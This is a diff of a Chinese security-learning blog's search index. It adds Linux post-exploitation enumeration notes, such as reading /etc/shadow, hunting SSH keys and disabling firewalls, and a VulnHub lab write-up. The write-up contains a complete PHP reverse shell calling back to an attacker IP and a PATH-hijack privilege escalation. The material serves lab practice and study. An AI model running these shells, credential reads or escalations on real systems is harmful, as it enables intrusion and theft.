@@ -1,6 +1,148 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>linux系统渗透测试常用命令及基础知识</title>
+    <url>/2022/11/08/12-15-43/</url>
+    <content><![CDATA[<h1 id="linux系统渗透测试常用命令及基础知识"><a href="#linux系统渗透测试常用命令及基础知识" class="headerlink" title="linux系统渗透测试常用命令及基础知识"></a>linux系统渗透测试常用命令及基础知识</h1><p>在打靶时发现自己对于Linux系统的基本指令及常识缺乏严重以至于当自己在进入靶机后无从下手。现就此简单学习记录一下。</p>
+<p>参考文章链接：</p>
+<p><a href="https://blog.csdn.net/luansj/article/details/97272672"> Linux常用命令大全（非常全！！！）_木头大左的博客-CSDN博客_linux常用命令</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247489896&idx=1&sn=f3b0d372f3ec62b3bbdef15e5a8c33fa&chksm=cea8f228f9df7b3e5057215e521cbad9147fedd1313a01237fa10ea2b2ad03d3cb8273f833f1#rd">详细|Linux内网渗透基础篇 (qq.com)</a></p>
+<p>飞书东方隐侠团队文档</p>
+<h1 id="基础判断理解"><a href="#基础判断理解" class="headerlink" title="基础判断理解"></a>基础判断理解</h1><p>当我们进入目标机器拿到权限时我们第一时间要判断的就是我们的权限是什么</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108125019.png"></p>
+<p>如图,我使用我打过的一个靶机举例:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#:管理员</span><br><span class="line">$:普通用户</span><br><span class="line">@:之前表示登录的用户名称，之后表示主机名，再之后表示当前所在目录</span><br><span class="line">/:表示根目录  </span><br><span class="line">~:表示当前用户家目录</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用cd 命令不加参数,默认回到当前用户家目录</span><br><span class="line">使用cd / 命令,可回到/目录下</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在上图中我通过ssh远程连接到的主机拿到的权限就是普通用户,目前位于该用户的文件夹目录下.</p>
+<h1 id="权限利用的思路"><a href="#权限利用的思路" class="headerlink" title="权限利用的思路"></a>权限利用的思路</h1><p>当我们进入到受害机后应该有一个完整的思路.</p>
+<h2 id="按我目前的知识眼界来"><a href="#按我目前的知识眼界来" class="headerlink" title="按我目前的知识眼界来:"></a>按我目前的知识眼界来:</h2><p>一般当我们进入到受害机时拿到的权限都是不同的,所以这时我们的第一思路都是提权,但不同的用户提权都不一样</p>
+<h3 id="linux用户区分"><a href="#linux用户区分" class="headerlink" title="linux用户区分:"></a>linux用户区分:</h3><p>id：查看当前用户UID</p>
+<ul>
+<li><h4 id="管理用户和组账号"><a href="#管理用户和组账号" class="headerlink" title="管理用户和组账号"></a>管理用户和组账号</h4></li>
+<li><ul>
+<li><p> 用户账号分为       </p>
+</li>
+<li><p> 超级用户、普通用户、程序用户 </p>
+</li>
+<li><p>组账号分为     </p>
+</li>
+<li><p>   基本组(私有组)、附加组(公共组)</p>
+</li>
+<li><p> UID和GID   </p>
+</li>
+<li><p> UID(用户标识符)    GID(组标识符)</p>
+</li>
+<li><ul>
+<li>0：系统的管理员用户</li>
+<li>1~999：Linux为了避免某个服务程序出现漏洞被攻击者提权至整个服务器，所以默认服务程序会有独立的系统用户负责运行</li>
+<li><code>&gt;=</code>1000：管理员创建，用于日常工作的用户</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><ul>
+<li><p>一个账号只能有一个基本组，但是可以有多个附加组</p>
+</li>
+<li><p>用户的账号信息存储在/etc/passwd</p>
+</li>
+<li><p>用户密码信息存储在/etc/shadow</p>
+</li>
+<li><p>当用户在/etc/shadow中的密码信息前有一个或两个！时表示用户被锁定</p>
+</li>
+</ul>
+<h2 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h2><p>当我们进入受害机时首先就是要判断我们拿到的用户能干嘛</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat /etc/passwd     列出系统上的所有用户</span><br><span class="line">cat /etc/shadow     查看用户Hash</span><br><span class="line">cat /etc/group      列出系统上的所有组</span><br><span class="line">groups              当前用户所在的组</span><br><span class="line">groups test         test用户所在的组</span><br><span class="line">getent group xxx      xxx组里的用户</span><br><span class="line"></span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;      列出所有的超级用户账户</span><br><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow  #查看是否存在空口令用户</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow #查看远程登录的账号 </span><br><span class="line"></span><br><span class="line">whoami              查看当前用户</span><br><span class="line">w                   谁目前已登录，他们正在做什么</span><br><span class="line">who                 命令用于显示系统中有哪些使用者正在上面</span><br><span class="line">last                最后登录用户的列表</span><br><span class="line">lastlog             所有用户上次登录的信息</span><br><span class="line">lastlog –u %username%  有关指定用户上次登录的信息</span><br></pre></td></tr></table></figure>
+
+<p>使用靶机举例:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108132748.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108132804.png"></p>
+<p>silky用户位于sudo组下,我们可以尝试 sudo su root 命令直接提权到root权限.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108134115.png"></p>
+<p>如图所示,我们成功拿到root权限,</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>但我们并不可能像菜鸡靶机一样,随随便便就能拿到一个在adm组,sudo组里的用户,所以在得到我们的用户不属于那种直接就能提权的用户后.我们就需要对受害机进行信息收集.看看有没有可以利用的漏洞缺陷.</p>
+<h3 id="信息收集点："><a href="#信息收集点：" class="headerlink" title="信息收集点："></a>信息收集点：</h3><p>参考链接：<a href="https://blog.csdn.net/bring_coco/article/details/114262148"> Linux信息收集_番茄酱料的博客-CSDN博客</a></p>
+<h4 id="系统信息收集："><a href="#系统信息收集：" class="headerlink" title="系统信息收集："></a>系统信息收集：</h4><p>命令：</p>
+<p>命令：uname -r<br>作用：打印内核版本信息</p>
+<p>命令：uname -n<br>作用：系统主机名字</p>
+<p>命令：uname -n<br>作用：系统主机名字</p>
+<p>命令：uname -m<br>作用：系统架构</p>
+<p>命令：uname -a<br>作用：打印所有可用的系统信息，包括查看内核/操作系统/信息等</p>
+<p>命令：cat /proc/version<br>作用：查看内核信息</p>
+<p>命令：cat /proc/cpuinfo<br>作用：查看CPU详情</p>
+<p>命令：cat /etc/*-release 注：这里的是因为不同系统名称不同<br>作用：查看发布信息</p>
+<p>命令：df -a<br>作用：文件系统信息</p>
+<h4 id="用户和组的信息"><a href="#用户和组的信息" class="headerlink" title="用户和组的信息:"></a>用户和组的信息:</h4><p>上文已经介绍过一部分了,现在更详细一点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd     列出系统上的所有用户</span><br><span class="line">cat /etc/shadow     查看用户Hash(需要root权限)</span><br><span class="line">cat /etc/group      列出系统上的所有组</span><br><span class="line">groups              当前用户所在的组</span><br><span class="line">groups test         test用户所在的组</span><br><span class="line">getent group xxx      xxx组里的用户</span><br><span class="line"></span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;      列出所有的超级用户账户</span><br><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow  #查看是否存在空口令用户</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow #查看远程登录的账号 </span><br><span class="line"></span><br><span class="line">whoami              查看当前用户</span><br><span class="line">w                   谁目前已登录，他们正在做什么</span><br><span class="line">who                 命令用于显示系统中有哪些使用者正在上面</span><br><span class="line">last                最后登录用户的列表</span><br><span class="line">lastlog             所有用户上次登录的信息</span><br><span class="line">lastlog –u %username%  有关指定用户上次登录的信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息:"></a>用户和权限信息:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：whoami</span><br><span class="line">作用：查看当前用户</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：id</span><br><span class="line">作用：查看当前用户信息</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：cat /etc/sudoers</span><br><span class="line">作用：可以使用sudo提升到root用户（需要root权限）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：sudo</span><br><span class="line">作用：允许普通用户执行一些或者全部的root命令的一个工具</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：sudo -l</span><br><span class="line">作用：列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：su 用户（指定要切换身份的目标用户）</span><br><span class="line">作用：切换当前用户身份到其他用户身份</span><br></pre></td></tr></table></figure>
+
+<h4 id="系统内环境信息："><a href="#系统内环境信息：" class="headerlink" title="系统内环境信息："></a>系统内环境信息：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v命令：env</span><br><span class="line">作用：打印系统环境信息</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：echo $USER</span><br><span class="line">作用：输出上述环境变量中的信息</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：history</span><br><span class="line">作用：打印历史命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：pwd</span><br><span class="line">作用：显示当前路径</span><br></pre></td></tr></table></figure>
+
+<h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息:"></a>网络信息:</h4><p>或许是判断主机是否外联或组成域的关键</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：ifconfig</span><br><span class="line">作用：查看所有网络接口的属性</span><br></pre></td></tr></table></figure>
+
+<p>主机防火墙,但我们打的靶机一般是不会有滴</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：iptables -L</span><br><span class="line">作用：查看防火墙设置</span><br><span class="line">查看防火墙状态：</span><br><span class="line">systemctl status firewalld</span><br><span class="line">service iptables status</span><br><span class="line">暂时关闭防火墙:</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">service iptables stop</span><br><span class="line">永久关闭防火墙：</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">chkconfig iptables off</span><br><span class="line">重启防火墙：</span><br><span class="line">systemctl enable firewalld</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221109115544.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：route -n</span><br><span class="line">作用：查看路由表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>下面两个命令最常用了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：netstat -lntp</span><br><span class="line">作用：查看所有监听端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：netstat -antp</span><br><span class="line">作用：查看所有已经建立的连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：netstat -an</span><br><span class="line">作用：打印本地端口开放信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>端口映射：</strong>端口映射就是将内网中的主机的一个端口映射到外网主机的一个端口，提供相应的服务。当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：cat /etc/services</span><br><span class="line">作用：查看端口服务映射</span><br></pre></td></tr></table></figure>
+
+<h4 id="查找有用的信息"><a href="#查找有用的信息" class="headerlink" title="查找有用的信息:"></a>查找有用的信息:</h4><p>查找能写或执行的目录</p>
+<p>该命令是根据当前用户的权限所列出的该用户可操作文件目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -o+w -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -o+x -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h4 id="敏感文件查找"><a href="#敏感文件查找" class="headerlink" title="敏感文件查找:"></a>敏感文件查找:</h4><p>find命令 -o参数 表示 <strong>或者</strong> 的意思 (可以按该命令格式改一下我们想查找的文件)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -iname &quot;*.bash_history&quot; -o -iname &quot;*config*&quot; -o -iname &quot;web.xml&quot; -o -iname &quot;*database*&quot; -o -iname &quot;*pass*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>查找SSH密钥:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls</span><br></pre></td></tr></table></figure>
+
+<h1 id="web应用服务常见配置文件路径"><a href="#web应用服务常见配置文件路径" class="headerlink" title="web应用服务常见配置文件路径:"></a>web应用服务常见配置文件路径:</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/bin/php.ini</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/apache2/apache.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/sites-available/default</span><br><span class="line">/etc/apache2/vhosts.d/00_default_vhost.conf</span><br><span class="line">/etc/httpd/conf.d/httpd.conf</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/php.ini</span><br><span class="line">/etc/php/apache/php.ini</span><br><span class="line">/etc/php/apache2/php.ini</span><br><span class="line">/etc/php/cgi/php.ini</span><br><span class="line">/etc/php/php.ini</span><br><span class="line">/etc/php/php4/php.ini</span><br><span class="line">/etc/php4.4/fcgi/php.ini</span><br><span class="line">/etc/php4/apache/php.ini</span><br><span class="line">/etc/php4/apache2/php.ini</span><br><span class="line">/etc/php4/cgi/php.ini</span><br><span class="line">/etc/php5/apache/php.ini</span><br><span class="line">/etc/php5/apache2/php.ini</span><br><span class="line">/etc/php5/cgi/php.ini</span><br><span class="line">/etc/phpmyadmin/config.inc.php</span><br><span class="line">/home/apache/conf/httpd.conf</span><br><span class="line">/home/apache2/conf/httpd.conf</span><br><span class="line">/home/bin/stable/apache/php.ini</span><br><span class="line">/home2/bin/stable/apache/php.ini</span><br><span class="line">/NetServer/bin/stable/apache/php.ini</span><br><span class="line">/opt/www/conf/httpd.conf</span><br><span class="line">/opt/xampp/etc/php.ini</span><br><span class="line">/PHP/php.ini</span><br><span class="line">/php/php.ini</span><br><span class="line">/php4/php.ini</span><br><span class="line">/php5/php.ini</span><br><span class="line">/usr/lib/php.ini</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/lib/php/php.ini</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/php.ini</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/php.ini</span><br><span class="line">/usr/local/etc/php.ini</span><br><span class="line">/usr/local/httpd/conf/httpd.conf</span><br><span class="line">/usr/local/lib/php.ini</span><br><span class="line">/usr/local/php/lib/php.ini</span><br><span class="line">/usr/local/php4/lib/php.ini</span><br><span class="line">/usr/local/php4/lib/php.ini</span><br><span class="line">/usr/local/php4/php.ini</span><br><span class="line">/usr/local/php5/etc/php.ini</span><br><span class="line">/usr/local/php5/lib/php.ini</span><br><span class="line">/usr/local/php5/php5.ini</span><br><span class="line">/usr/local/share/examples/php/php.ini</span><br><span class="line">/usr/local/share/examples/php4/php.ini</span><br><span class="line">/usr/local/Zend/etc/php.ini</span><br><span class="line">/var/apache2/config.inc</span><br><span class="line">/var/httpd/conf/httpd.conf</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/local/www/conf/httpd.conf</span><br><span class="line">/var/local/www/conf/php.ini</span><br><span class="line">/var/www/conf/httpd.conf</span><br><span class="line">/web/conf/php.ini</span><br><span class="line">/www/conf/httpd.conf</span><br><span class="line">/www/php/php.ini</span><br><span class="line">/www/php4/php.ini</span><br><span class="line">/www/php5/php.ini</span><br><span class="line">/xampp/apache/bin/php.ini</span><br><span class="line">/xampp/apache/conf/httpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/mysql/user.MYD</span><br><span class="line">/usr/local/mysql/bin/mysql</span><br><span class="line">/usr/local/mysql/my.cnf</span><br><span class="line">/usr/share/mysql/my.cnf</span><br></pre></td></tr></table></figure>
+
+<p>埋个坑,找找自动化脚本,我记得小迪视频里就有</p>
+]]></content>
+      <categories>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>基础知识</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctf学习笔记</title>
     <url>/2022/10/19/10-48-16/</url>
     <content><![CDATA[<h1 id="新开一章主要用来记载ctf比赛的学习"><a href="#新开一章主要用来记载ctf比赛的学习" class="headerlink" title="新开一章主要用来记载ctf比赛的学习"></a>新开一章主要用来记载ctf比赛的学习</h1><h1 id="在开始前我们得知道什么是ctf"><a href="#在开始前我们得知道什么是ctf" class="headerlink" title="在开始前我们得知道什么是ctf"></a>在开始前我们得知道什么是ctf</h1><p>ctf是属网络信息安全夺旗赛</p>
@@ -276,6 +418,17 @@
       </tags>
   </entry>
   <entry>
+    <title>内网学习笔记</title>
+    <url>/2022/10/19/10-49-13/</url>
+    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vlunhub-darkhole靶场</title>
     <url>/2022/11/06/15-57-44/</url>
     <content><![CDATA[<h1 id="vlunhub-darkhole-靶场（简单-提权）"><a href="#vlunhub-darkhole-靶场（简单-提权）" class="headerlink" title="vlunhub-darkhole 靶场（简单-提权）"></a>vlunhub-darkhole 靶场（简单-提权）</h1><h1 id="首先是遇到的问题"><a href="#首先是遇到的问题" class="headerlink" title="首先是遇到的问题"></a>首先是遇到的问题</h1><h2 id="本次靶场带来了许多新知识点"><a href="#本次靶场带来了许多新知识点" class="headerlink" title="本次靶场带来了许多新知识点"></a>本次靶场带来了许多新知识点</h2><h3 id="1）反弹shell-php-reverse-shell"><a href="#1）反弹shell-php-reverse-shell" class="headerlink" title="1）反弹shell (php-reverse-shell)"></a>1）反弹shell (php-reverse-shell)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$ip = &quot;192.168.50.131&quot;;</span><br><span class="line">$port = &quot;8888&quot;;</span><br><span class="line"> </span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) </span><br><span class="line">	exit(&quot;$errstr ($errno)&quot;);</span><br><span class="line"> </span><br><span class="line">if(function_exists(&#x27;proc_open&#x27;))&#123;</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span><br><span class="line">);</span><br><span class="line">$process = proc_open(&quot;id;/bin/sh -i&quot;, $descriptorspec, $pipes);</span><br><span class="line">if (!is_resource($process)) </span><br><span class="line">	exit(&quot;ERROR: Can&#x27;t reverse shell&quot;);</span><br><span class="line"> </span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line">	</span><br><span class="line">print(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"> </span><br><span class="line">while (1) &#123;</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$input = fread($sock, 1024);</span><br><span class="line">	fwrite($pipes[0], $input);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[1], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[2], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">&#125;	</span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line">&#125;</span><br><span class="line">else print &quot;function &#x27;proc_open&#x27; is not exists.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -300,6 +453,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp   // 回到tmp目录</span><br><span class="line">touch id   //创建假的id命令文件</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; id//id文件中写入/bin/bash 字段，生成一个shell</span><br><span class="line">chmod 777 id    //赋予id全文件权限</span><br><span class="line">export PATH=/tmp:$PATH //设置环境变量</span><br><span class="line">cd /home/john</span><br><span class="line">./toto</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><a href="https://blog.csdn.net/wangxueying5172/article/details/121552506"> DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
+<p><a href="http://lnmp.ailinux.net/id">http://lnmp.ailinux.net/id</a></p>
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-老规矩-查看靶机IP地址"><a href="#1-老规矩-查看靶机IP地址" class="headerlink" title="1.老规矩,查看靶机IP地址"></a>1.老规矩,查看靶机IP地址</h2><p>使用netdiscover -r 192.168.50.1/24 探测靶机IP地址</p>
 <p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221106161918.png"></p>
 <p>192.168.50.133</p>
@@ -403,220 +557,6 @@
       </categories>
       <tags>
         <tag>靶场渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web基础</title>
-    <url>/2022/10/17/17-43-58/</url>
-    <content><![CDATA[<h1 id="总结一下到目前所学的基础知识"><a href="#总结一下到目前所学的基础知识" class="headerlink" title="总结一下到目前所学的基础知识:"></a>总结一下到目前所学的基础知识:</h1><p>大概涉及很多方面但涉及到的深入一点的也会另开新卷详细描述</p>
-<p>主要涉及到的都是小迪2020课程里面的内容:</p>
-<p>常常更新</p>
-<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄:"></a>摘抄:</h2><p><strong>1：攻击方与防御方的本质是什么？</strong>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。<strong>2：安全公司的本质是什么？</strong>盈利，最小投入，最大产出。<strong>3：安全公司产品的本质是什么？</strong>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的客户）<strong>4：安全人员的本质是什么？</strong>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。<strong>5：对接客户的本质是什么？</strong>对接客户也是某公司内安全工作的一员，与概念 4 相同。清晰了以上 5 个概念，作为攻击者，要首先考虑到对抗成本，什么样的对抗成本，能满足概念 1-5。影响或阻碍对手方的核心利益。把概念加入到后门，更隐蔽，更长久。</p>
-<h2 id="HTTP-规划定义了-8-种可能的请求方法："><a href="#HTTP-规划定义了-8-种可能的请求方法：" class="headerlink" title="HTTP 规划定义了 8 种可能的请求方法："></a>HTTP 规划定义了 8 种可能的请求方法：</h2><p>GET：检索 URL 中标识资源的一个简单请求 </p>
-<p>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 </p>
-<p>POST：服务器接受被写入客户端输出流中的数据的请求 </p>
-<p>PUT：服务器保存请求数据作为指定 URL 新内容的请求 </p>
-<p>DELETE：服务器删除 URL 中命令的资源的请求 </p>
-<p>OPTIONS：关于服务器支持的请求方法信息的请求 </p>
-<p>TRACE：web 服务器反馈 Http 请求和其头标的请求 </p>
-<p>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 </p>
-<p>#请求头由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 </p>
-<h2 id="HTTP-响应码："><a href="#HTTP-响应码：" class="headerlink" title="HTTP 响应码："></a>HTTP 响应码：</h2><p>1xx：信息，请求收到，继续处理 </p>
-<p>2xx：成功，行为被成功地接受、理解和采纳 </p>
-<p>3xx：重定向，为了完成请求，必须进一步执行的动作 </p>
-<p>4xx：客户端错误 </p>
-<p>5xx：服务器错误 </p>
-<h1 id="信息收集决定攻击深度"><a href="#信息收集决定攻击深度" class="headerlink" title="信息收集决定攻击深度"></a>信息收集决定攻击深度</h1><p><img src="/imgs/$%7Bfiilename%7D/image-20220929190720671.png"></p>
-<h2 id="信息收集是攻击面打开的必要操作"><a href="#信息收集是攻击面打开的必要操作" class="headerlink" title="信息收集是攻击面打开的必要操作"></a>信息收集是攻击面打开的必要操作</h2><p>更多的信息可以测试更多的漏洞方面</p>
-<p>无论是src还是渗透测试一个具体目标</p>
-<p>信息收集的方式多种多样</p>
-<p>有像fofa一样的在黑暗引擎中大海捞针,不错过与测试网站相关的一个页面</p>
-<p>有得到一个web页面后对网站进行扫描,收集IP地址开放的端口号,网站后台目录,后台文件,有时候我们的突破口就产生在这里面</p>
-<p>最常用的就是御剑后台扫描工具,nmap工具,kali里的dirp 工具,部署在服务器端上的msf(这是一个大学问) ,还有一款叫水泽的信息收集工具,等等,后面知道更多了还会添加.</p>
-<p>内网信息收集是针对进入目标主机后进行的信息收集操作,此方面涉及到系统的操作命令学习,</p>
-<p>（<a href="https://blog.csdn.net/qq_43001579/article/details/83591539">(真·Nmap用法大全_车大叔的博客-CSDN博客</a>）</p>
-<h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充:"></a>其他补充:</h3><p>F12进行查看网站网络可以看到server：里面的信息</p>
-<p>server：看的信息很全的很可能就是由网页搭建平台搭建的</p>
-<p>WAF存在时，扫描会产生误差，网站可能拒绝访问</p>
-<p>检查时网站返回的数据包里面可能有某些可疑信息，里面可能就是含有WAF</p>
-<p>（X-Powered-By：WAF）</p>
-<p>子域名查找及C段旁注等。</p>
-<h1 id="web漏洞知识点"><a href="#web漏洞知识点" class="headerlink" title="web漏洞知识点"></a>web漏洞知识点</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220905205200543.png"></p>
-<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞:"></a>文件上传漏洞:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220906174853666.png"></p>
-<h4 id="查找与判断"><a href="#查找与判断" class="headerlink" title="查找与判断"></a>查找与判断</h4><p>黑盒测试，扫描</p>
-<p>搜索引擎搜索upload</p>
-<p>会员文件传输页面</p>
-<p>后台权限页面</p>
-<p>白盒代码分析查找文件上传源码</p>
-<p>文件上传抓包判断</p>
-<p>黑名单：明确不让上传的格式后缀</p>
-<p>在定义后缀名不完整的情况下，我们可以用其他格式，达到同样效果，看网站的知识应用层面</p>
-<p>白名单：明确可以上传的格式后缀</p>
-<p>更安全一些</p>
-<h3 id="文件上传漏洞测试思维"><a href="#文件上传漏洞测试思维" class="headerlink" title="文件上传漏洞测试思维"></a>文件上传漏洞测试思维</h3><p>1,通过字典扫描，或者判断会员中心等都可能存在文件上传漏洞</p>
-<p>2,到测试站点是否存在解析漏洞如：iis apache Nginx 等</p>
